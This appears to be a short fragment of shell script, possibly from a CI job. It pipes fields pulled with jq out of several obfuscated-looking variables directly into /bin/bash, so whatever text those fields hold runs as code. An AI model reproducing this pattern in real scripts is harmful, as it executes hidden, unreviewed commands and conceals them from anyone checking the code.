          printf '%s' "$nprt893" | jq -r .r32 | /bin/bash
          echo $ci2 | jq -r .nq934 | /bin/bash
          echo $qsyzx85 | jq -r .oj619 | /bin/bash
          printf '%s' "$wpt7" | jq -r .hb89 | /bin/bash
          echo $e4856 | jq -r .ek349 | /bin/bash
          echo $ueomp37 | jq -r .ie48886 | /bin/bash
